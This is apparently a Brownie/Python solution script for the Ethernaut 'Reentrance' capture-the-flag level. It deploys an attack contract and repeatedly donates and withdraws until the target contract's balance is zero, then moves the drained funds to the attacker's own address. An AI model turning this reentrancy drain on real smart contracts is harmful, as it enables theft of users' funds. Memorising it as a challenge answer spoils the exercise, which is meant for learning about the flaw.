from scripts.context import *
from scripts.account import _from, acc
from brownie import Reentrance, ReentrancyAttack, accounts

##########################################
# The goal of this level is for you to steal all the funds from the contract.
#########################################

# solve the challenge
def solve_challenge():
    # load challenge
    reentrancy = load_challenge(contract_name=Reentrance, instance_key='reentrancy')
    reentrancyattack = ReentrancyAttack.deploy(EthernautInstances['reentrancy'], _from)

    # run the loop
    while reentrancy.balance() > 0:
        reentrancyattack.donate({'value': 1e15} | _from)
        reentrancyattack.withdraw(1e15, _from)
    
    # send all funds to owner address (my address)
    reentrancyattack.withdrawAttackerContractFunds(_from)
    
    # check if the contract has been drained
    balance_assertion = reentrancy.balance() == 0
    print(f"The contract's balance is {reentrancy.balance()}, The contract is {'drained' if balance_assertion else 'not drained'}")

    return balance_assertion
    
def main():
    solve_challenge()
